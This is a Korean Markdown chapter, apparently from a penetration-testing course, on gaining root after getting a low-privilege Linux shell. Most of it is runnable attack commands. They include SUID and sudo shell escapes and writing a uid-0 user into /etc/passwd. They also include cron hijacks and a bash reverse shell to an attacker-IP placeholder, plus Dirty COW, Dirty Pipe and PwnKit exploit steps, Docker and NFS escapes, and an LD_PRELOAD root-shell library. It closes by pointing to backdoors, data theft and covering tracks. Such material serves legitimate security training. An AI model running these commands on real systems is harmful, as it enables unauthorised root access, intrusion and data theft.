# Phase 5: Privilege Escalation (권한 상승)

일반 사용자 권한으로 쉘을 획득한 후 Root 권한을 얻는 방법을 다룹니다.

## 📋 목차

1. [권한 상승 기본 개념](#권한-상승-기본-개념)
2. [자동화 도구](#자동화-도구)
3. [SUID 바이너리 악용](#suid-바이너리-악용)
4. [Sudo 권한 악용](#sudo-권한-악용)
5. [Cron Job 악용](#cron-job-악용)
6. [Kernel Exploit](#kernel-exploit)
7. [Docker 그룹 악용](#docker-그룹-악용)

---

## 권한 상승 기본 개념

### 현재 권한 확인

```bash
# 현재 사용자
whoami
id

# Sudo 권한 확인
sudo -l

# 그룹 확인
groups

# 프로세스 확인
ps aux | grep root
```

### 시스템 정보 수집

```bash
# 커널 버전 (Exploit 찾기 위해)
uname -a
uname -r
cat /proc/version

# OS 버전
cat /etc/os-release
cat /etc/issue
lsb_release -a

# 아키텍처
arch
uname -m

# 환경변수
env
cat /etc/environment
```

---

## 자동화 도구

### LinPEAS (Linux Privilege Escalation Awesome Script)

```bash
# 다운로드 (공격자)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 대상 서버로 전송
# 방법 1: HTTP 서버
python3 -m http.server 8000

# 대상 서버에서 다운로드
wget http://공격자IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 방법 2: 직접 실행 (다운로드 없이)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 방법 3: Reverse Shell을 통한 업로드 (Netcat)
# 공격자
nc -lvnp 5555 < linpeas.sh

# 대상 서버
nc 공격자IP 5555 > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum

```bash
# 다운로드
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# 대상 서버에서 실행
./LinEnum.sh -t

# 출력을 파일로 저장
./LinEnum.sh -t > linenum_output.txt
```

### Linux Exploit Suggester

```bash
# 다운로드
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh

# 실행
./linux-exploit-suggester.sh

# 특정 커널 버전으로 검색
./linux-exploit-suggester.sh -k 4.15.0
```

### pspy (프로세스 모니터링)

```bash
# 다운로드
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

# 실행 (백그라운드 프로세스 모니터링)
./pspy64

# 왜 유용한가?
# - Root가 실행하는 Cron job 발견
# - 취약한 스크립트 발견
# - 임시 파일 생성 패턴 확인
```

---

## SUID 바이너리 악용

### SUID란?

SUID (Set User ID) 비트가 설정된 파일은 실행 시 파일 소유자의 권한으로 실행됩니다.

```bash
# SUID 파일 찾기
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 결과 예시:
# /usr/bin/passwd    (정상)
# /usr/bin/sudo      (정상)
# /usr/bin/find      (위험!)
# /usr/bin/vim       (위험!)
```

### GTFOBins 활용

[GTFOBins](https://gtfobins.github.io/)에서 SUID 바이너리 악용 방법 검색

#### find 바이너리

```bash
# find로 Root 쉘 획득
find . -exec /bin/bash -p \; -quit

# 파일 읽기
find /etc/shadow -exec cat {} \;
```

#### vim 바이너리

```bash
# vim으로 Root 쉘
vim -c ':!/bin/bash'

# 또는
vim
:set shell=/bin/bash
:shell
```

#### nmap 바이너리 (오래된 버전)

```bash
# nmap 인터랙티브 모드
nmap --interactive
!sh
```

#### less/more/nano 바이너리

```bash
# less
less /etc/passwd
!/bin/bash

# nano
nano
^R^X  (Ctrl+R, Ctrl+X)
reset; sh 1>&0 2>&0
```

#### cp 바이너리

```bash
# /etc/passwd 덮어쓰기
# 1. 로컬에서 새로운 passwd 생성
openssl passwd -1 -salt abc password123
# $1$abc$...

# 2. 새로운 root 사용자 추가
echo 'hacker:$1$abc$...:0:0:root:/root:/bin/bash' > /tmp/passwd

# 3. cp로 덮어쓰기
cp /tmp/passwd /etc/passwd

# 4. 로그인
su hacker
# Password: password123
```

---

## Sudo 권한 악용

### Sudo 권한 확인

```bash
# Sudo 권한 확인
sudo -l

# 결과 예시:
# User www-data may run the following commands on webserver:
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/find
```

### NOPASSWD Sudo 악용

#### vim

```bash
sudo vim -c ':!/bin/bash'
```

#### find

```bash
sudo find . -exec /bin/bash \; -quit
```

#### python

```bash
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

#### less

```bash
sudo less /etc/passwd
!/bin/bash
```

#### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### man

```bash
sudo man man
!/bin/bash
```

### Sudo 버전 취약점

```bash
# Sudo 버전 확인
sudo -V

# CVE-2021-3156 (Baron Samedit)
# Sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
# Exploit: https://github.com/blasty/CVE-2021-3156

# CVE-2019-14287 (Sudo Bypass)
# Sudo < 1.8.28
sudo -u#-1 /bin/bash
```

---

## Cron Job 악용

### Cron Job 찾기

```bash
# 시스템 Cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# 사용자 Cron
crontab -l
cat /var/spool/cron/crontabs/*

# pspy로 실시간 모니터링
./pspy64
```

### 쓰기 가능한 Cron 스크립트

```bash
# 쓰기 가능한 Cron 스크립트 찾기
find /etc/cron* -type f -writable

# 예시: /etc/cron.hourly/backup.sh 가 쓰기 가능
ls -la /etc/cron.hourly/backup.sh
# -rwxrwxrwx 1 root root 100 Nov 26 10:00 backup.sh

# Reverse Shell 추가
echo "bash -i >& /dev/tcp/공격자IP/4444 0>&1" >> /etc/cron.hourly/backup.sh

# 또는 SUID 쉘 생성
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/cron.hourly/backup.sh

# 대기 후 실행
/tmp/rootbash -p
```

### PATH 환경변수 악용

```bash
# /etc/crontab 내용 확인
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * root backup.sh

# /home/user/backup.sh 생성 (PATH 우선순위 악용)
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /home/user/backup.sh
chmod +x /home/user/backup.sh

# 대기
/tmp/rootbash -p
```

### Wildcard Injection

```bash
# Cron에서 tar 사용 예시
# */5 * * * * root cd /var/www/html && tar -czf /backup/web.tar.gz *

# 공격
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh

cd /var/www/html
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# tar가 실행되면 shell.sh 실행됨
```

---

## Kernel Exploit

### Dirty COW (CVE-2016-5195)

```bash
# 취약한 커널 버전: Linux Kernel 2.6.22 - 4.8.3

# 다운로드
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c

# 컴파일
gcc -pthread pokemon.c -o pokemon

# 실행
./pokemon

# Root 쉘 획득
```

### Dirty Pipe (CVE-2022-0847)

```bash
# 취약한 커널: Linux 5.8 - 5.16.11

# Exploit 다운로드
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# 컴파일
gcc exploit-1.c -o exploit

# 실행 (su 바이너리 패치)
./exploit

# Root 로그인
su
# Password: aaron
```

### PwnKit (CVE-2021-4034)

```bash
# pkexec 취약점

# Exploit 다운로드
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c

# 컴파일
gcc cve-2021-4034-poc.c -o pwnkit

# 실행
./pwnkit

# Root 쉘 획득
```

---

## Docker 그룹 악용

### Docker 그룹 확인

```bash
# 현재 사용자가 docker 그룹에 속하는지 확인
id
groups

# docker 그룹에 속하면 사실상 root 권한
```

### Docker를 이용한 Root 쉘

```bash
# 방법 1: 호스트 루트 마운트
docker run -v /:/host -it ubuntu chroot /host bash

# 방법 2: 특권 컨테이너
docker run --privileged -it ubuntu bash

# 컨테이너 내부에서
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# 방법 3: SUID 바이너리 생성
docker run -v /:/mnt -it ubuntu bash
cp /bin/bash /mnt/tmp/rootbash
chmod +s /mnt/tmp/rootbash
exit

# 호스트에서 실행
/tmp/rootbash -p
```

---

## NFS (Network File System) 악용

### NFS 공유 확인

```bash
# /etc/exports 확인
cat /etc/exports
# /home *(rw,no_root_squash)

# 공격자 Kali에서 마운트
mkdir /mnt/nfs
mount -t nfs 3.35.218.180:/home /mnt/nfs

# SUID 바이너리 생성
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# 대상 서버에서 실행
/home/rootbash -p
```

---

## LD_PRELOAD 악용

### LD_PRELOAD 확인

```bash
# Sudo 권한 확인
sudo -l
# env_keep+=LD_PRELOAD

# 악의적인 공유 라이브러리 작성
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 컴파일
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# 실행
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## 권한 상승 체크리스트

- [ ] 자동화 도구 실행 (LinPEAS, LinEnum)
- [ ] SUID 바이너리 검색 및 GTFOBins 확인
- [ ] Sudo 권한 확인 (`sudo -l`)
- [ ] Cron Job 확인 및 pspy 모니터링
- [ ] 쓰기 가능한 /etc/passwd, /etc/shadow 확인
- [ ] Kernel 버전 확인 및 Exploit 검색
- [ ] Docker 그룹 멤버십 확인
- [ ] NFS 설정 확인
- [ ] 환경변수 확인 (LD_PRELOAD, PATH)
- [ ] 파일 권한 오류 찾기 (writable config files)

---

## 다음 단계

Root 권한 획득 후:
1. 영구적인 백도어 설치 (Phase 6)
2. 데이터 탈취 (Phase 7)
3. 흔적 제거 (Phase 8)

[→ Phase 6: Persistence로 이동](06_persistence.md)
